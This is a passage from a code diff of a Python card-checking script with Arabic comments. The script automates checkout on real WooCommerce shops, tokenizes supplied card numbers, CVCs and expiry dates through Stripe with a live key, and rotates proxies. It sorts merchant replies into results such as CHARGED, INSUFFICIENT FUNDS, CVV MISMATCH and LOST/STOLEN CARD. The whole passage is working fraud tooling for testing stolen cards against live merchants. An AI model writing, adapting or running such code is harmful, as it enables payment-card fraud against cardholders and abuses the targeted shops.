"+")}%26billing_address_2%3D%26billing_city%3D{billing_city}%26billing_state%3D%26billing_postcode%3D{billing_postcode}%26shipping_country%3DGB%26sgwcav_postcode_lookup%3D%26sgwcav_address_type%3Dshipping%26sgwcav_append_field%3Dcountry%26sgwcav_complete_fields%3D%255B%2522address_1%2522%252C%2522address_2%2522%252C%2522city%2522%252C%2522state%2522%252C%2522postcode%2522%255D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26shipping_method%255B0%255D%3Dflat_rate%253A1%26gruum_shipping_user_selected%3D%26payment_method%3Dwoocommerce_payments%26wc-woocommerce_payments-new-payment-method%3Dtrue%26wc_braintree_paypal_payment_nonce%3D%26wc_braintree_device_data%3D%26wc-braintree-paypal-context%3Dshortcode%26wc_braintree_paypal_amount%3D7.95%26wc_braintree_paypal_currency%3DGBP%26wc_braintree_paypal_locale%3Den_gb%26wc-braintree-paypal-tokenize-payment-method%3Dtrue%26terms%3Don%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F%26cart%255Bb97ad5ced76c1c8c295fee0b96fab900%255D%255Bqty%255D%3D1%26coupon_code%3D%26sgg_cid%3D193575931.1779524948%26sgg_sid%3D1779524947%26sgg_sn%3D1%26sgg_ts%3DJTdCJTIyc3IlMjIlM0ElMjIoZGlyZWN0KSUyMiUyQyUyMnNtJTIyJTNBJTIyKG5vbmUpJTIyJTJDJTIyZHIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5ncnV1bS5jb20lMkZjYXJ0JTJGJTIyJTJDJTIyZGwlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5ncnV1bS5jb20lMkYlMjIlN0Q%253D%26sgg_fbc%3D%26sgg_fbp%3Dfb.1.1779524848445.452660124.AQECAQIB&shipping_method%5B0%5D=flat_rate%3A1'
+            
+            response = r.post(AJAX_URL, params=params_update, headers=headers_update, data=data_update, timeout=20)
+            
+            # ================ 5. STRIPE TOKENIZATION ================
+            # تنسيق رقم البطاقة (إزالة المسافات)
+            card_number = n.replace(' ', '')
+            
+            headers_stripe = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': user,
+                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+            }
+            
+            # إضافة مسافات كل 4 أرقام لبطاقة (للتنسيق)
+            formatted_card = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
+            
+            data_stripe = f'billing_details[name]={billing_first}+{billing_last}&billing_details[email]={billing_email}&billing_details[phone]={billing_phone}&billing_details[address][city]={billing_city}&billing_details[address][country]=GB&billing_details[address][line1]={billing_address.replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={billing_postcode}&billing_details[address][state]=&type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F58d9408f11%3B+stripe-js-v3%2F58d9408f11%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.gruum.com&time_on_page=139866&client_attribution_metadata[client_session_id]={session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1J5IdF3ELpi&client_attribution_metadata[elements_session_config_id]=37c4bb51-c745-4f0e-9f73-8463111820eb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b4b18f58-a598-465e-9a59-7dc1bc8dc8b1ea9b98&muid=cff8716e-6eb6-4881-95ee-e6cccbc24eea3ceb2d&sid=8e04c614-93bd-4e5c-91e6-0f0200c4a57cf1783a&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KVevl2HOLdFMK8z'
+            
+            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
+            try:
+                pm_id = response.json()['id']
+            except:
+                print(f"[!] Stripe tokenization failed with proxy {proxy_ip}, retrying...")
+                continue
+            
+            # ================ 6. FINAL CHECKOUT ================
+            headers_final = {
+                'authority': 'www.gruum.com',
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': SITE_URL,
+                'referer': CHECKOUT_URL,
+                'user-agent': user,
+                'x-requested-with': 'XMLHttpRequest',
+                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'Connection': 'close',
+            }
+            
+            params_final = {'wc-ajax': 'checkout'}
+            
+            data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.gruum.com%2Fcart%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.gruum.com%2F&wc_order_attribution_session_start_time=2026-05-23+08%3A27%3A36&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={billing_email}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_phone={billing_phone}&sgm_optin=1&billing_country=GB&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=&billing_city={billing_city}&billing_state=&billing_postcode={billing_postcode}&shipping_country=GB&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_method%5B0%5D=flat_rate%3A1&gruum_shipping_user_selected=&payment_method=woocommerce_payments&wc-woocommerce_payments-new-payment-method=true&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&cart%5Bb97ad5ced76c1c8c295fee0b96fab900%5D%5Bqty%5D=1&coupon_code=&wcpay-payment-method={pm_id}&wcpay-fraud-prevention-token='
+            
+            response = r.post(AJAX_URL, params=params_final, headers=headers_final, data=data_final, timeout=20)
+            
+            # ================ 7. PARSE RESULT (Stripe Responses) ================
+            try:
+                result_data = json.loads(response.text)
+                messages = result_data.get("messages", "")
+                full_response = response.text
+            except:
+                return 'PARSE_ERROR'
+            
+            clean_messages = clean_html(messages)
+            clean_full = clean_html(full_response)
+            search_text = clean_messages + " " + clean_full
+            
+            reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
+            reason = reason_match.group(1).strip() if reason_match else None
+            
+            print(f"[DEBUG] Clean response: {search_text[:300]}")
+            
+            # ==================== ردود Stripe ====================
+            
+            # 1. نجاح
+            if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
+                return 'CHARGED'
+            
+            # 2. رصيد غير كافٍ
+            if 'insufficient funds' in search_text or 'insufficient_funds' in search_text:
+                return 'INSUFFICIENT FUNDS'
+            
+            # 3. بطاقة مرفوضة
+            if 'card was declined' in search_text or 'declined' in search_text:
+                return 'CARD DECLINED'
+            
+            # 4. رقم بطاقة غير صحيح
+            if 'card number is incorrect' in search_text or 'invalid card number' in search_text:
+                return 'INVALID CARD NUMBER'
+            
+            # 5. بطاقة منتهية
+            if 'expired card' in search_text or 'card expired' in search_text:
+                return 'EXPIRED CARD'
+            
+            # 6. CVV خطأ
+            if 'cvv' in search_text or 'security code is incorrect' in search_text:
+                return 'CVV MISMATCH'
+            
+            # 7. 3D Secure مطلوب
+            if '3d secure' in search_text or 'three_d_secure' in search_text or 'requires action' in search_text:
+                return '3D SECURE REQUIRED'
+            
+            # 8. احتيال
+            if 'fraud' in search_text or 'risk' in search_text:
+                return 'FRAUD'
+            
+            # 9. خطأ في المعالجة
+            if 'processing error' in search_text or 'error processing' in search_text:
+                return 'PROCESSING ERROR'
+            
+            # 10. عنوان غير مطابق
+            if 'address' in search_text and 'mismatch' in search_text:
+                return 'ADDRESS MISMATCH'
+            
+            # 11. أي سبب تاني
+            if reason and len(reason) < 60:
+                return reason.upper()
+            
+            if clean_messages and len(clean_messages) < 100:
+                return clean_messages.title()
+            
+            return 'DECLINED'
+            
+        except Exception as e:
+            last_error = str(e)[:50]
+            print(f"[!] Proxy {proxy_ip} failed: {last_error}")
+            if attempt == max_retries - 1:
+                return f'PROXY_ERROR: {last_error}'
+            continue
     
-    # ================ 6. FINAL CHECKOUT ================
-    print("\n[7/7] Processing final checkout...")
-    
-    cookies_final = {
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
-        'wp_woocommerce_session_f1ff18e17fcd94bf2b9e3d5c17b3e4f8': 't_9eaa8086c9c8b3e968cd370a397d01%7C1779440018%7C1779353618%7C%24generic%24J7RznWHVRXt8tp7z7GkIqv67jqD_cLrzERusaVHs',
-        '__stripe_mid': muid,
-        '__stripe_sid': sid,
-        'woocommerce_items_in_cart': '1',
-        'woocommerce_cart_hash': '531e4a448eed85e8bb08abe41c5848b5',
-    }
-    
-    headers_final = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://anas-emporium.com',
-        'referer': 'https://anas-emporium.com/checkout/',
-        'user-agent': user,
-        'x-requested-with': 'XMLHttpRequest',
-        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    params_final = {'wc-ajax': 'checkout'}
-    
-    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fanas-emporium.com%2F&wc_order_attribution_session_start_time=2026-05-20+08%3A52%3A36&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={fake_data["email"]}&billing_first_name={fake_data["first_name"]}&billing_last_name={fake_data["last_name"]}&billing_company=&billing_country=US&billing_address_1={fake_data["address_1"].replace(" ", "+")}&billing_address_2=&billing_city={fake_data["city"]}&billing_state={fake_data["state"]}&billing_postcode={fake_data["postcode"]}&billing_phone={fake_data["phone"]}&shipping_first_name={fake_data["first_name"]}&shipping_last_name={fake_data["last_name"]}&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city={fake_data["city"]}&shipping_state={fake_data["state"]}&shipping_postcode={fake_data["postcode"]}&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&woocommerce-process-checkout-nonce={check_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={payment_method_id}'
-    
-    response = r.post('https://anas-emporium.com/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
-    print(f"[7/7] Final checkout status: {response.status_code}")
-    
-    # ================ 8. PARSE RESULT ================
-    print("\n[8/8] Parsing result...")
-    
-    try:
-        result_data = json.loads(response.text)
-        messages = result_data.get("messages", "")
-        full_response = response.text
-        print(f"[8/8] Response JSON: {json.dumps(result_data, indent=2)[:500]}")
-    except:
-        print(f"[8/8] Raw response: {response.text[:500]}")
-        return 'PARSE_ERROR'
-    
-    clean_messages = clean_html(messages)
-    clean_full = clean_html(full_response)
-    search_text = clean_messages + " " + clean_full
-    
-    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
-    reason = reason_match.group(1).strip() if reason_match else None
-    
-    print(f"\n[DEBUG] Clean response: {search_text[:300]}")
-    
-    # ==================== ردود Stripe الكاملة والمفصلة ====================
-    
-    success_keywords = ['charged', 'success', 'completed', 'approved', 'payment successful', 'order received', 
-                        'thank you for your order', 'order confirmed', 'transaction approved', 'payment completed',
-                        'payment succeeded', 'charge succeeded']
-    if any(keyword in search_text for keyword in success_keywords):
-        return 'CHARGED'
-    
-    # بطاقة مرفوضة (Declined)
-    declined_keywords = ['your card has been declined', 'card declined', 'the card was declined', 'card was declined']
-    if any(keyword in search_text for keyword in declined_keywords):
-        return 'CARD DECLINED'
-    
-    # رقم بطاقة غير صحيح
-    if 'your card number is incorrect' in search_text or 'invalid card number' in search_text:
-        return 'INVALID CARD NUMBER'
-    
-    # رصيد غير كافٍ
-    if 'insufficient funds' in search_text:
-        return 'INSUFFICIENT FUNDS'
-    
-    # بطاقة منتهية
-    if 'expired card' in search_text or 'card expired' in search_text:
-        return 'EXPIRED CARD'
-    
-    # CVV خطأ
-    if 'cvv' in search_text or 'cvv verification failed' in search_text or 'incorrect_cvc' in search_text:
-        return 'CVV MISMATCH'
-    
-    # Do Not Honor
-    if 'do not honor' in search_text:
-        return 'DO NOT HONOR'
-    
-    # احتيال
-    if 'fraud' in search_text or 'suspected fraud' in search_text or 'fraudulent' in search_text:
-        return 'SUSPECTED FRAUD'
-    
-    # 3D Secure مطلوب
-    if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text or 'authentication_required' in search_text:
-        return '3D SECURE REQUIRED'
-    
-    # بطاقة مفقودة أو مسروقة
-    if 'lost or stolen' in search_text:
-        return 'LOST/STOLEN CARD'
-    
-    # تجاوز الحد
-    if 'limit exceeded' in search_text:
-        return 'LIMIT EXCEEDED'
-    
-    # عنوان غير مطابق
-    if 'address verification' in search_text or 'avs' in search_text:
-        return 'ADDRESS MISMATCH'
-    
-    # خطأ في المعالجة
-    if 'processing error' in search_text or 'processor declined' in search_text:
-        return 'PROCESSOR DECLINED'
-    
-    # أي سبب تاني من الـ Reason
-    if reason and len(reason) < 50:
-        return reason.upper()
-    
-    if clean_messages and len(clean_messages) < 100:
-        return clean_messages.title()
-    
-    if 'declined' in search_text:
-        return 'CARD DECLINED'
-    
-    return 'CARD DECLINED'
+    return f'PROXY_ERROR: {last_error}'
